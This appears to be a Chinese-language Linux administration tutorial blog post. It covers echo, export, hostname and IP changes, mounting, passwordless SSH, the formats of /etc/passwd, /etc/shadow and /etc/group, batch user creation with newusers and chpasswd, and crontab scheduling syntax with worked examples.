<figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line">python<span class="variable">@ubuntu</span><span class="symbol">:~</span><span class="variable">$ </span>echo -e <span class="string">&quot;hello\t\t world！&quot;</span>  解析转义字符</span><br><span class="line">hello            world！</span><br><span class="line">python<span class="variable">@ubuntu</span><span class="symbol">:~</span><span class="variable">$ </span>echo -E <span class="string">&quot;hello\t\t world！&quot;</span>  不解析转义字符</span><br><span class="line">hello\t\t world！</span><br><span class="line">python<span class="variable">@ubuntu</span><span class="symbol">:~</span><span class="variable">$ </span>echo <span class="variable">$a</span>  输出环境变量</span><br><span class="line">b</span><br><span class="line"><span class="number">123456</span></span><br></pre></td></tr></table></figure>
<h4 id="设置或显示环境变量：export">设置或显示环境变量：export</h4>
<p>在 shell 中执行程序时，shell 会提供一组环境变量。export 可新增，修改或删除环境变量，供后续执行的程序使用。export 的效力仅限于该次登陆操作。</p>
<figure class="highlight inform7"><table><tr><td class="code"><pre><span class="line">export <span class="comment">[-fnp]</span><span class="comment">[变量名称]</span>=<span class="comment">[变量设置值]</span></span><br><span class="line">1</span><br></pre></td></tr></table></figure>
<p><strong>参数说明</strong>：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>-f 　代表[变量名称]中为函数名称。</p>
</li>
<li class="lvl-2">
<p>-n 　删除指定的变量。变量实际上并未删除，只是不会输出到后续指令的执行环境中。</p>
</li>
<li class="lvl-2">
<p>-p 　列出所有的shell赋予程序的环境变量。</p>
</li>
</ul>
<figure class="highlight clean"><table><tr><td class="code"><pre><span class="line"># <span class="keyword">export</span> MYENV=<span class="number">7</span> <span class="comment">//定义环境变量并赋值</span></span><br><span class="line"># <span class="keyword">export</span> -p <span class="comment">//列出当前的环境变量</span></span><br><span class="line"><span class="number">12</span></span><br></pre></td></tr></table></figure>
<h4 id="修改主机名-ip地址">修改主机名&amp;ip地址</h4>
<p>显示主机名：hostname</p>
<p>临时修改：hostname xxx</p>
<p><strong>永久修改</strong></p>
<p>对于Ubuntu 系统</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="keyword">vim</span> /etc/<span class="built_in">hostname</span></span><br><span class="line"><span class="number">1</span></span><br></pre></td></tr></table></figure>
<p>对于centos系统</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">vim <span class="regexp">/etc/</span>sysconfig/network</span><br><span class="line"><span class="number">1</span></span><br></pre></td></tr></table></figure>
<p>在此配置文件中添加一条HOSTNAME=node1</p>
<p>针对centos7系统，可以使用如下命令</p>
<figure class="highlight dsconfig"><table><tr><td class="code"><pre><span class="line"><span class="string">hostnamectl</span> <span class="built_in">set-hostname</span> <span class="string">xxx</span></span><br><span class="line"><span class="string">1</span></span><br></pre></td></tr></table></figure>
<p>一般需要重开shell甚至重启操作系统才能生效。</p>
<p><strong>修改IP地址</strong></p>
<p>ifconfig eth0 192.168.12.22(重启后无效)</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">vim <span class="regexp">/etc/</span>sysconfig<span class="regexp">/network-scripts/i</span>fcfg-eth0</span><br><span class="line"><span class="number">1</span></span><br></pre></td></tr></table></figure>
<h4 id="mount挂载">mount挂载</h4>
<p>mount 挂载外部存储设备到文件系统中</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> /mnt/cdrom 创建一个目录，用来挂载</span><br><span class="line">mount -t iso9660 -o ro /dev/cdrom /mnt/cdrom/     </span><br><span class="line">12</span><br></pre></td></tr></table></figure>
<p>将设备/dev/cdrom挂载到 挂载点 ： /mnt/cdrom中</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">umount <span class="regexp">/mnt/</span>cdrom</span><br><span class="line"><span class="number">1</span></span><br></pre></td></tr></table></figure>
<h4 id="ssh免密登陆">ssh免密登陆</h4>
<p>假如 A 要登陆 B<br>
在A上操作：首先生成密钥对</p>
<figure class="highlight lisp"><table><tr><td class="code"><pre><span class="line">ssh-keygen (提示时，直接回车即可)</span><br><span class="line"><span class="number">1</span></span><br></pre></td></tr></table></figure>
<p>再将A自己的公钥拷贝并追加到B的授权列表文件authorized_keys中</p>
<figure class="highlight applescript"><table><tr><td class="code"><pre><span class="line">ssh-<span class="keyword">copy</span>-<span class="built_in">id</span> B</span><br><span class="line"><span class="number">1</span></span><br></pre></td></tr></table></figure>
<h3 id="批量添加用户">批量添加用户</h3>
<h4 id="与用户账号有关的系统文件">与用户账号有关的系统文件</h4>
<p>完成用户管理的工作本质都是对有关的系统文件进行修改，这些系统文件包括/etc/passwd, /etc/shadow, /etc/group等。</p>
<p><strong>/etc/passwd记录用户的基本属性</strong></p>
<p>它的内容类似下面的例子：</p>
<figure class="highlight dts"><table><tr><td class="code"><pre><span class="line">＃ cat <span class="keyword">/etc/</span>passwd</span><br><span class="line"><span class="symbol"></span></span><br><span class="line"><span class="symbol">root:</span>x:<span class="number">0</span>:<span class="number">0</span>:Superuser:/:</span><br><span class="line"><span class="symbol">daemon:</span>x:<span class="number">1</span>:<span class="number">1</span>:System daemons:/etc:</span><br><span class="line"><span class="symbol">bin:</span>x:<span class="number">2</span>:<span class="number">2</span>:Owner of system commands:/bin:</span><br><span class="line"><span class="symbol">sys:</span>x:<span class="number">3</span>:<span class="number">3</span>:Owner of system files:<span class="keyword">/usr/</span>sys:</span><br><span class="line"><span class="symbol">adm:</span>x:<span class="number">4</span>:<span class="number">4</span>:System accounting:<span class="keyword">/usr/</span>adm:</span><br><span class="line"><span class="symbol">uucp:</span>x:<span class="number">5</span>:<span class="number">5</span>:UUCP administrator:<span class="keyword">/usr/</span>lib/uucp:</span><br><span class="line"><span class="symbol">auth:</span>x:<span class="number">7</span>:<span class="number">21</span>:Authentication administrator:<span class="keyword">/tcb/</span>files/auth:</span><br><span class="line"><span class="symbol">cron:</span>x:<span class="number">9</span>:<span class="number">16</span>:Cron daemon:<span class="keyword">/usr/</span>spool/cron:</span><br><span class="line"><span class="symbol">listen:</span>x:<span class="number">37</span>:<span class="number">4</span>:Network daemon:<span class="keyword">/usr/</span>net/nls:</span><br><span class="line"><span class="symbol">lp:</span>x:<span class="number">71</span>:<span class="number">18</span>:Printer administrator:<span class="keyword">/usr/</span>spool/lp:</span><br><span class="line"><span class="symbol">sam:</span>x:<span class="number">200</span>:<span class="number">50</span>:Sam san:<span class="keyword">/home/</span>sam:<span class="keyword">/bin/</span>sh</span><br><span class="line"><span class="number">12345678910111213</span></span><br></pre></td></tr></table></figure>
<p>/etc/passwd中一行记录对应着一个用户，每行记录又被冒号(:)分隔为7个字段，其格式和具体含义如下：</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line">用户名:口令:用户标识号:组标识号:注释性描述:主目录:登录<span class="keyword">Shell</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash">1</span></span><br></pre></td></tr></table></figure>
<p><strong>用户名：</strong></p>
<p>通常长度不超过8个字符，由大小写字母和/或数字组成，不能有冒号(😃。登录名中不能有冒号(😃，因为冒号在这里是分隔符。</p>
<p>为了兼容起见，登录名中最好不要包含点字符(.)，并且不使用连字符(-)和加号(+)打头。</p>
<p><strong>口令：</strong></p>
<p>本身存放用户口令的加密串，但现在许多Linux 系统都使用了shadow技术，把真正的加密后的用户口令字存放到/etc/shadow文件中，而/etc/passwd文件的口令字段中只存放一个特殊的字符，例如“x”或者“*”。</p>
<p><strong>用户标识号：</strong></p>
<p>是一个整数，系统内部用它来标识用户。一般情况下它与用户名是一一对应的，如果几个用户名对应的用户标识号是一样的，系统内部将把它们视为同一个用户，但是它们可以有不同的口令、不同的主目录以及不同的登录Shell等。</p>
<p>通常用户标识号的取值范围是0～65 535。0是超级用户root的标识号，1～99由系统保留，作为管理账号，普通用户的标识号从100开始。</p>
<p><strong>组标识号：</strong></p>
<p>记录用户所属的用户组，对应着/etc/group文件中的一条记录。</p>
<p><strong>注释性描述：</strong></p>
<p>一段任意编写的注释，创建账户时可以通过<code>useradd -c 用户名</code>的<code>-c</code>参数指定。</p>
<p><strong>主目录：</strong></p>
<p>用户的起始工作目录，用户在登录到系统之后所处的目录。</p>
<p><strong>登录Shell：</strong></p>
<p>用户登录后，要启动一个进程，负责将用户的操作传给内核，这个进程是用户登录到系统后运行的命令解释器或某个特定的程序，即Shell。</p>
<p>Shell是用户与Linux系统之间的接口。Linux的Shell有许多种，每种都有不同的特点。常用的有sh(Bourne Shell), csh(C Shell), ksh(Korn Shell), tcsh(TENEX/TOPS-20 type C Shell),  bash(Bourne Again Shell)等。</p>
<p>可以通过usermod的<code>-s</code>参数为用户指定某个Shell。如果useradd不通过<code>-s</code>参数指定shell，那么系统使用bash为默认的登录Shell，即这个字段的值为/bin/bash。</p>
<p>为用户的登录指定特定的Shell可以限制用户只能运行指定的应用程序，在该应用程序运行结束后，用户就自动退出了系统。不过大部分Linux系统要求只有在系统中登记过的shell才能出现在这个字段中。</p>
<p><strong>伪用户（pseudo users）</strong></p>
<p>这些用户的登陆shell为/usr/sbin/nologin，即不能登录。它们的存在主要是方便系统管理，满足相应的系统进程对文件属主的要求。</p>
<p>常见的伪用户如下所示：</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">bin 拥有可执行的用户命令文件 </span><br><span class="line">sys 拥有系统文件 </span><br><span class="line">adm 拥有帐户文件 </span><br><span class="line">uucp UUCP使用 </span><br><span class="line"><span class="built_in">lp</span> <span class="built_in">lp</span>或lpd子系统使用 </span><br><span class="line">nobody NFS使用</span><br><span class="line"><span class="number">123456</span></span><br></pre></td></tr></table></figure>
<p>还有许多标准的伪用户，例如：audit, cron, mail, usenet等，它们也都各自为相关的进程和文件所需要。</p>
<p><strong>/etc/shadow</strong></p>
<p>对安全性要求较高的Linux系统都把/etc/passwd文件中的口令字段保存在/etc/shadow文件中，超级用户才拥有该文件读权限。</p>
<p>/etc/shadow中的记录行与/etc/passwd中的一一对应，它由pwconv命令根据/etc/passwd中的数据自动产生</p>
<p>字段是：</p>
<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line"><span class="section">登录名:加密口令:最后一次修改时间:最小时间间隔:最大时间间隔:警告时间:不活动时间:失效时间:标志</span></span><br><span class="line">1</span><br></pre></td></tr></table></figure>
<ol>
<li class="lvl-3">
<p>&quot;登录名&quot;是与/etc/passwd文件中的登录名相一致的用户账号</p>
</li>
<li class="lvl-3">
<p>&quot;口令&quot;字段存放的是加密后的用户口令字，长度为13个字符。如果为空，则对应用户没有口令，登录时不需要口令；如果含有不属于集合 { ./0-9A-Za-z }中的字符，则对应的用户不能登录。</p>
</li>
<li class="lvl-3">
<p>&quot;最后一次修改时间&quot;表示的是从某个时刻起，到用户最后一次修改口令时的天数。大部分linux系统的时间起点是1970年1月1日。</p>
</li>
<li class="lvl-3">
<p>&quot;最小时间间隔&quot;指的是两次修改口令之间所需的最小天数。</p>
</li>
<li class="lvl-3">
<p>&quot;最大时间间隔&quot;指的是口令保持有效的最大天数。</p>
</li>
<li class="lvl-3">
<p>&quot;警告时间&quot;字段表示的是从系统开始警告用户到用户密码正式失效之间的天数。</p>
</li>
<li class="lvl-3">
<p>&quot;不活动时间&quot;表示的是用户没有登录活动但账号仍能保持有效的最大天数。</p>
</li>
<li class="lvl-3">
<p>&quot;失效时间&quot;字段给出的是一个绝对的天数，如果使用了这个字段，那么就给出相应账号的生存期。期满后，该账号就不再是一个合法的账号，也就不能再用来登录了。</p>
</li>
</ol>
<p>下面是/etc/shadow的一个例子：</p>
<figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line">＃ cat /etc/shadow</span><br><span class="line"></span><br><span class="line"><span class="symbol">root:</span><span class="symbol">Dnakfw28zf38w:</span><span class="number">8764</span><span class="symbol">:</span><span class="number">0</span><span class="symbol">:</span><span class="number">168</span><span class="symbol">:</span><span class="number">7</span>:::</span><br><span class="line"><span class="symbol">daemon:</span>*::<span class="number">0</span><span class="symbol">:</span><span class="number">0</span>::::</span><br><span class="line"><span class="symbol">bin:</span>*::<span class="number">0</span><span class="symbol">:</span><span class="number">0</span>::::</span><br><span class="line"><span class="symbol">sys:</span>*::<span class="number">0</span><span class="symbol">:</span><span class="number">0</span>::::</span><br><span class="line"><span class="symbol">adm:</span>*::<span class="number">0</span><span class="symbol">:</span><span class="number">0</span>::::</span><br><span class="line"><span class="symbol">uucp:</span>*::<span class="number">0</span><span class="symbol">:</span><span class="number">0</span>::::</span><br><span class="line"><span class="symbol">nuucp:</span>*::<span class="number">0</span><span class="symbol">:</span><span class="number">0</span>::::</span><br><span class="line"><span class="symbol">auth:</span>*::<span class="number">0</span><span class="symbol">:</span><span class="number">0</span>::::</span><br><span class="line"><span class="symbol">cron:</span>*::<span class="number">0</span><span class="symbol">:</span><span class="number">0</span>::::</span><br><span class="line"><span class="symbol">listen:</span>*::<span class="number">0</span><span class="symbol">:</span><span class="number">0</span>::::</span><br><span class="line"><span class="symbol">lp:</span>*::<span class="number">0</span><span class="symbol">:</span><span class="number">0</span>::::</span><br><span class="line"><span class="symbol">sam:</span><span class="symbol">EkdiSECLWPdSa:</span><span class="number">9740</span><span class="symbol">:</span><span class="number">0</span><span class="symbol">:</span><span class="number">0</span>::::</span><br><span class="line"><span class="number">1234567891011121314</span></span><br></pre></td></tr></table></figure>
<p><strong>/etc/group记录用户组信息</strong></p>
<p>每个用户都属于某个用户组；一个组中可以有多个用户，一个用户也可以属于不同的组。</p>
<p>当一个用户同时是多个组中的成员时，在/etc/passwd文件中记录的是用户所属的主组，也就是登录时所属的默认组，而其他组称为附加组。</p>
<p>用户要访问属于附加组的文件时，必须首先使用newgrp命令使自己成为所要访问的组中的成员。</p>
<p>用户组的所有信息都存放在/etc/group文件中，字段有：</p>
<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line"><span class="section">组名:口令:组标识号:组内用户列表</span></span><br><span class="line">1</span><br></pre></td></tr></table></figure>
<ol>
<li class="lvl-3">
<p>&quot;组名&quot;是用户组的名称，由字母或数字构成。与/etc/passwd中的登录名一样，组名不应重复。</p>
</li>
<li class="lvl-3">
<p>&quot;口令&quot;字段存放的是用户组加密后的口令字。一般Linux 系统的用户组都没有口令，即这个字段一般为空，或者是*。</p>
</li>
<li class="lvl-3">
<p>&quot;组标识号&quot;与用户标识号类似，也是一个整数，被系统内部用来标识组。</p>
</li>
<li class="lvl-3">
<p>&quot;组内用户列表&quot;是属于这个组的所有用户的列表，不同用户之间用逗号(,)分隔。这个用户组可能是用户的主组，也可能是附加组。</p>
</li>
</ol>
<p>/etc/group文件的一个例子如下：</p>
<figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line">root::<span class="number">0</span><span class="symbol">:root</span></span><br><span class="line">bin::<span class="number">2</span><span class="symbol">:root</span>,bin</span><br><span class="line">sys::<span class="number">3</span><span class="symbol">:root</span>,uucp</span><br><span class="line">adm::<span class="number">4</span><span class="symbol">:root</span>,adm</span><br><span class="line">daemon::<span class="number">5</span><span class="symbol">:root</span>,daemon</span><br><span class="line">lp::<span class="number">7</span><span class="symbol">:root</span>,lp</span><br><span class="line">users::<span class="number">20</span><span class="symbol">:root</span>,sam</span><br><span class="line"><span class="number">1234567</span></span><br></pre></td></tr></table></figure>
<h4 id="实操">实操</h4>
<p><strong>先编辑一个文本用户文件</strong></p>
<p>每一列按照<code>/etc/passwd</code>密码文件的格式书写，要注意每个用户的用户名、UID、宿主目录都不可以相同，其中密码栏可以留做空白或输入x号。一个范例文件user.txt内容如下：</p>
<figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line">user001::<span class="number">601</span><span class="symbol">:</span><span class="number">100</span><span class="symbol">:user</span><span class="symbol">:/home/user001</span><span class="symbol">:/bin/bash</span></span><br><span class="line">user002::<span class="number">602</span><span class="symbol">:</span><span class="number">100</span><span class="symbol">:user</span><span class="symbol">:/home/user002</span><span class="symbol">:/bin/bash</span></span><br><span class="line">user003::<span class="number">603</span><span class="symbol">:</span><span class="number">100</span><span class="symbol">:user</span><span class="symbol">:/home/user003</span><span class="symbol">:/bin/bash</span></span><br><span class="line">user004::<span class="number">604</span><span class="symbol">:</span><span class="number">100</span><span class="symbol">:user</span><span class="symbol">:/home/user004</span><span class="symbol">:/bin/bash</span></span><br><span class="line">user005::<span class="number">605</span><span class="symbol">:</span><span class="number">100</span><span class="symbol">:user</span><span class="symbol">:/home/user005</span><span class="symbol">:/bin/bash</span></span><br><span class="line">user006::<span class="number">606</span><span class="symbol">:</span><span class="number">100</span><span class="symbol">:user</span><span class="symbol">:/home/user006</span><span class="symbol">:/bin/bash</span></span><br><span class="line"><span class="number">123456</span></span><br></pre></td></tr></table></figure>
<p><strong>执行<code>/usr/sbin/newusers</code>命令</strong></p>
<p>需要root权限：</p>
<figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line"><span class="meta"># newusers &lt; user.txt</span></span><br><span class="line"><span class="number">1</span></span><br></pre></td></tr></table></figure>
<p>可以执行命令 <code>vipw</code> 或 <code>vi /etc/passwd</code> 检查 <code>/etc/passwd</code> 文件是否已经出现这些用户的数据，并且用户的宿主目录是否已经创建。</p>
<p><strong>取消 <code>shadow password</code> 功能</strong></p>
<p>将 <code>/etc/shadow</code> 产生的 <code>shadow</code> 密码解码，然后回写到 <code>/etc/passwd</code> 中，并将<code>/etc/shadow</code>的<code>shadow</code>密码栏删掉。这是为了方便下一步的密码转换工作，即先取消 <code>shadow password</code> 功能。</p>
<p>执行<code>/usr/sbin/pwunconv</code>命令:</p>
<figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line"><span class="meta"># pwunconv</span></span><br><span class="line"><span class="number">1</span></span><br></pre></td></tr></table></figure>
<p><strong>编辑每个用户的密码对照文件</strong></p>
<p>格式为：</p>
<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line"><span class="section">用户名:密码</span></span><br><span class="line">1</span><br></pre></td></tr></table></figure>
<p>实例文件 <code>passwd.txt</code> 内容如下：</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">user001</span>:<span class="number">123456</span></span><br><span class="line"><span class="attribute">user002</span>:<span class="number">123456</span></span><br><span class="line"><span class="attribute">user003</span>:<span class="number">123456</span></span><br><span class="line"><span class="attribute">user004</span>:<span class="number">123456</span></span><br><span class="line"><span class="attribute">user005</span>:<span class="number">123456</span></span><br><span class="line"><span class="attribute">user006</span>:<span class="number">123456</span></span><br><span class="line"><span class="attribute">123456</span></span><br></pre></td></tr></table></figure>
<p><strong>执行 <code>/usr/sbin/chpasswd</code>命令</strong></p>
<p>需要root权限：</p>
<p>创建用户密码，<code>chpasswd</code> 会将经过 <code>/usr/bin/passwd</code> 命令编码过的密码写入 <code>/etc/passwd</code> 的密码栏。</p>
<figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line"><span class="meta"># chpasswd &lt; passwd.txt</span></span><br><span class="line"><span class="number">1</span></span><br></pre></td></tr></table></figure>
<p><strong>将密码编码为 <code>shadow password</code></strong></p>
<p>执行命令 <code>/usr/sbin/pwconv</code> 将密码编码为 <code>shadow password</code>，并将结果写入 <code>/etc/shadow</code>。</p>
<figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line"><span class="meta"># pwconv</span></span><br><span class="line"><span class="number">1</span></span><br></pre></td></tr></table></figure>
<p>这样就完成了大量用户的创建了，之后您可以到/home下检查这些用户宿主目录的权限设置是否都正确，并登录验证用户密码是否正确。</p>
<p><strong>完整步骤</strong></p>
<p>先准备好用户文件user和密码文件passwd</p>
<p>然后运行：</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line">newusers &lt; <span class="keyword">user</span></span><br><span class="line">pwunconv</span><br><span class="line">chpasswd &lt; passwd</span><br><span class="line">pwconv</span><br><span class="line"><span class="number">1234</span></span><br></pre></td></tr></table></figure>
<h3 id="crontab的使用">crontab的使用</h3>
<p>crontab命令是cron table的简写，它是cron的配置文件，也可以叫它作业列表。</p>
<p>相关配置文件如下：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>/var/spool/cron/ 目录下存放的是每个用户包括root的crontab任务，每个任务以创建者的名字命名</p>
</li>
<li class="lvl-2">
<p>/etc/crontab 这个文件负责调度各种管理和维护任务。</p>
</li>
<li class="lvl-2">
<p>/etc/cron.d/ 这个目录用来存放任何要执行的crontab文件或脚本。</p>
</li>
<li class="lvl-2">
<p>还可以把脚本放在/etc/cron.hourly、/etc/cron.daily、/etc/cron.weekly、/etc/cron.monthly目录中，让它每小时/天/星期、月执行一次。</p>
</li>
</ul>
<p>命令格式：</p>
<figure class="highlight crmsh"><table><tr><td class="code"><pre><span class="line">crontab [ -u <span class="keyword">user</span> <span class="title">] &#123; -l</span> | -r | -e &#125;</span><br><span class="line">//省略用户表表示操作当前用户的crontab</span><br><span class="line">    -e      (编辑工作表)</span><br><span class="line">    -l      (列出工作表里的命令)</span><br><span class="line">    -r      (删除工作表)</span><br><span class="line"><span class="number">12345</span></span><br></pre></td></tr></table></figure>
<p><strong>crontab -e</strong>进入当前用户的工作表编辑，是常见的vim界面。每行是一条命令。</p>
<p>crontab的命令构成为 时间+动作，其时间有<strong>分、时、日、月、周</strong>五种，操作符有</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>***** 取值范围内的所有数字</p>
</li>
<li class="lvl-2">
<p><strong>/</strong> 每过多少个数字</p>
</li>
<li class="lvl-2">
<p><strong>-</strong> 从X到Z</p>
</li>
<li class="lvl-2">
<p>**，**散列数字</p>
</li>
</ul>
<p>基本格式 :</p>
<figure class="highlight armasm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">f1</span>	<span class="built_in">f2</span>	<span class="built_in">f3</span>	<span class="built_in">f4</span>	<span class="built_in">f5</span>	command</span><br><span class="line">分	时	日	月	周	命令 </span><br><span class="line">第<span class="number">1</span>列表示分钟<span class="number">0</span>～<span class="number">59</span> 每分钟用*或者 */<span class="number">1</span>表示 </span><br><span class="line">第<span class="number">2</span>列表示小时<span class="number">0</span>～<span class="number">23</span>（<span class="number">0</span>表示<span class="number">0</span>点） </span><br><span class="line">第<span class="number">3</span>列表示日期<span class="number">1</span>～<span class="number">31</span> </span><br><span class="line">第<span class="number">4</span>列表示月份<span class="number">1</span>～<span class="number">12</span> </span><br><span class="line">第<span class="number">5</span>列标识号星期<span class="number">0</span>～<span class="number">6</span>（<span class="number">0</span>表示星期天） </span><br><span class="line">第<span class="number">6</span>列要运行的命令</span><br><span class="line"><span class="number">12345678</span></span><br></pre></td></tr></table></figure>
<p><img src="/posts/2c8b313c//Users/Administrator/Corazon/blog/source/_posts/%E3%80%90Linux%E3%80%91%E6%80%BB%E7%BB%93/99fb8a619138438d007b738d8630fbdc.jpeg" alt="img"></p>
<ul class="lvl-0">
<li class="lvl-2">
<p>其中 f1 是表示分钟，f2 表示小时，f3 表示一个月份中的第几日，f4 表示月份，f5 表示一个星期中的第几天。command表示要执行的命令。</p>
</li>
<li class="lvl-2">
<p>当 f1 为 * 时表示每分钟都要执行 program，f2 为 * 时表示每小时都要执行程序，以此类推</p>
</li>
<li class="lvl-2">
<p>当 f1 为 a-b 时表示从第 a 分钟到第 b 分钟这段时间内要执行，f2 为 a-b 时表示从第 a 到第 b 小时都要执行，以此类推</p>
</li>
<li class="lvl-2">
<p>当 f1 为 */n 时表示每 n 分钟个时间间隔执行一次，f2 为 */n 表示每 n 小时个时间间隔执行一次，以此类推</p>
</li>
<li class="lvl-2">
<p>当 f1 为 a, b, c,… 时表示第 a, b, c,… 分钟要执行，f2 为 a, b, c,… 时表示第 a, b, c…个小时要执行，以此类推</p>
</li>
</ul>
<p>在 12 月内, 每天的早上 6 点到 12 点，每隔 3 个小时 0 分钟执行一次 /usr/bin/backup</p>
<figure class="highlight basic"><table><tr><td class="code"><pre><span class="line"><span class="symbol">0 </span><span class="number">6</span>-<span class="number">12</span>/<span class="number">3</span> * <span class="number">12</span> * /<span class="keyword">usr</span>/bin/backup</span><br><span class="line"><span class="number">1</span></span><br></pre></td></tr></table></figure>
<p>周一到周五每天下午 5:00 寄一封信给 <a href="mailto:alex@domain.name">alex@domain.name</a></p>
<figure class="highlight basic"><table><tr><td class="code"><pre><span class="line"><span class="symbol">0 </span><span class="number">17</span> * * <span class="number">1</span>-<span class="number">5</span> mail -s <span class="string">&quot;hi&quot;</span> alex@domain.<span class="keyword">name</span> &lt; /tmp/maildata</span><br><span class="line"><span class="number">1</span></span><br></pre></td></tr></table></figure>
<p>每月每天的午夜 0 点 20 分, 2 点 20 分, 4 点 20 分…执行 echo “haha”</p>
<figure class="highlight basic"><table><tr><td class="code"><pre><span class="line"><span class="symbol">20 </span><span class="number">0</span>-<span class="number">23</span>/<span class="number">2</span> * * * echo <span class="string">&quot;haha&quot;</span></span><br><span class="line"><span class="number">1</span></span><br></pre></td></tr></table></figure>
<p>示例1：</p>
<figure class="highlight swift"><table><tr><td class="code"><pre><span class="line"><span class="number">45</span> <span class="number">4</span> <span class="number">1</span>,<span class="number">10</span>,<span class="number">22</span> <span class="operator">*</span> <span class="operator">*</span> <span class="regexp">/etc/</span><span class="keyword">init</span>.d<span class="operator">/</span>smb restart 每月<span class="number">1</span><span class="operator">、</span><span class="number">10</span><span class="operator">、</span><span class="number">22</span>日的<span class="number">4</span> : <span class="number">45</span>重启smb</span><br><span class="line"></span><br><span class="line"><span class="number">10</span> <span class="number">1</span> <span class="operator">*</span> <span class="operator">*</span> <span class="number">6</span>,<span class="number">0</span> <span class="regexp">/etc/</span><span class="keyword">init</span>.d<span class="operator">/</span>smb restart  每周六<span class="operator">、</span>周日的<span class="number">1</span> : <span class="number">10</span>重启smb</span><br><span class="line"></span><br><span class="line"><span class="number">0</span>,<span class="number">30</span> <span class="number">18</span><span class="operator">-</span><span class="number">23</span> <span class="operator">*</span> <span class="operator">*</span> <span class="operator">*</span> <span class="regexp">/etc/</span><span class="keyword">init</span>.d<span class="operator">/</span>smb restart  每天<span class="number">18</span> : <span class="number">00</span>至<span class="number">23</span> : <span class="number">00</span>之间每隔<span class="number">30</span>分钟重启smb</span><br><span class="line"></span><br><span class="line"><span class="number">0</span> <span class="number">23</span> <span class="operator">*</span> <span class="operator">*</span> <span class="number">6</span> <span class="regexp">/etc/</span><span class="keyword">init</span>.d<span class="operator">/</span>smb restart  每星期六的晚上<span class="number">11</span> : <span class="number">00</span> pm重启smb</span><br><span class="line"></span><br><span class="line"><span class="operator">*</span> <span class="operator">*/</span><span class="number">1</span> <span class="operator">*</span> <span class="operator">*</span> <span class="operator">*</span> <span class="regexp">/etc/</span><span class="keyword">init</span>.d<span class="operator">/</span>smb restart  每一小时重启smb</span><br><span class="line"></span><br><span class="line"><span class="operator">*</span> <span class="number">23</span><span class="operator">-</span><span class="number">7</span><span class="regexp">/1 * * * /</span>etc<span class="regexp">/init.d/</span>smb restart  晚上<span class="number">11</span>点到早上<span class="number">7</span>点之间，每隔一小时重启smb</span><br><span class="line"><span class="number">1234567891011</span></span><br></pre></td></tr></table></figure>
<p>示例2：</p>
<figure class="highlight basic"><table><tr><td class="code"><pre><span class="line"><span class="symbol">0 </span>*/<span class="number">2</span> * * * /sbin/service httpd restart  每两个小时重启一次apache </span><br><span class="line"></span><br><span class="line"><span class="symbol">50 </span><span class="number">7</span> * * * /sbin/service sshd start  每天<span class="number">7</span>：<span class="number">50</span>开启ssh服务 </span><br><span class="line"></span><br><span class="line"><span class="symbol">50 </span><span class="number">22</span> * * * /sbin/service sshd <span class="keyword">stop</span>  每天<span class="number">22</span>：<span class="number">50</span>关闭ssh服务 </span><br><span class="line"></span><br><span class="line"><span class="symbol">0 </span><span class="number">0</span> <span class="number">1</span>,<span class="number">15</span> * * fsck /home  每月<span class="number">1</span>号和<span class="number">15</span>号检查/home 磁盘 </span><br><span class="line"></span><br><span class="line"><span class="symbol">1 </span>* * * * /home/bruce/backup  每小时的第一分执行 /home/bruce/backup这个文件 </span><br><span class="line"></span><br><span class="line"><span class="symbol">00 </span><span class="number">03</span> * * <span class="number">1</span>-<span class="number">5</span> find /home <span class="string">&quot;*.xxx&quot;</span> -mtime +<span class="number">4</span> -exec rm &#123;&#125; \;  每周一至周五<span class="number">3</span>点钟，在目录/home中，查找文件名为*.xxx的文件，并删除<span class="number">4</span>天前的文件。</span><br><span class="line"></span><br><span class="line"><span class="symbol">30 </span><span class="number">6</span> */<span class="number">10</span> * * ls  每月的<span class="number">1</span>、<span class="number">11</span>、<span class="number">21</span>、<span class="number">31</span>日是的<span class="number">6</span>：<span class="number">30</span>执行一次ls命令</span><br><span class="line"><span class="number">12345678910111213</span></span><br></pre></td></tr></table></figure>
<p><strong>环境变量问题：</strong></p>
<p>有时创建了一个crontab，但是这个任务却无法自动执行，而手动执行这个任务却没有问题，这种情况一般是由于在crontab文件中没有配置环境变量引起的。</p>
<p>所以注意如下3点：</p>
<p>1）脚本中涉及文件路径时写全局路径；</p>
<p>2）脚本执行要用到java或其他环境变量时，通过source命令引入环境变量，如：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> start_cbp.sh</span><br><span class="line"><span class="comment">#!/bin/sh</span></span><br><span class="line"><span class="built_in">source</span> /etc/profile</span><br><span class="line"><span class="built_in">export</span> RUN_CONF=/home/d139/conf/platform/cbp/cbp_jboss.conf</span><br><span class="line">/usr/local/jboss-4.0.5/bin/run.sh -c mev &amp;</span><br><span class="line">12345</span><br></pre></td></tr></table></figure>
<p>3）当手动执行脚本OK，但是crontab死活不执行时，可以尝试在crontab中直接引入环境变量解决问题。如：</p>
<figure class="highlight basic"><table><tr><td class="code"><pre><span class="line"><span class="symbol">0 </span>* * * * . /etc/profile;/bin/sh /var/www/java/audit_no_count/bin/restart_audit.sh</span><br><span class="line"><span class="number">1</span></span><br></pre></td></tr></table></figure>
